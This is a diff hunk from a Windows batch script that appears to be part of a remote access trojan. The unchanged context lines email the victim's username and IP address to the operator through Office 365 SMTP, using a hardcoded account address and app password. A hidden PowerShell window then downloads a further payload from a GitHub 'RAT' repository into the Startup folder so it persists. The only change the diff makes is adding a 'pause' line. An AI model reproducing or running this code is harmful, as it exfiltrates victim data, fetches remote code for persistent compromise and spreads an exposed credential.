@@ -12,7 +12,7 @@ cd %STARTUP%
 @REM Set up SMTP
 powershell -NoProfile -Command "& { $email='fyp22356827@outlook.com'; $appPassword='qbpyymmalyudxsur'; $ip=(Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress -join ', '; $subject=\"$env:UserName logs\"; $smtp=New-Object System.Net.Mail.SmtpClient('smtp.office365.com',587); $smtp.EnableSsl=$true; $smtp.Credentials=New-Object System.Net.NetworkCredential($email,$appPassword); $smtp.Send($email,$email,$subject,$ip) }"
 
-
+pause
 @REM writeS payload to startup
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"
 
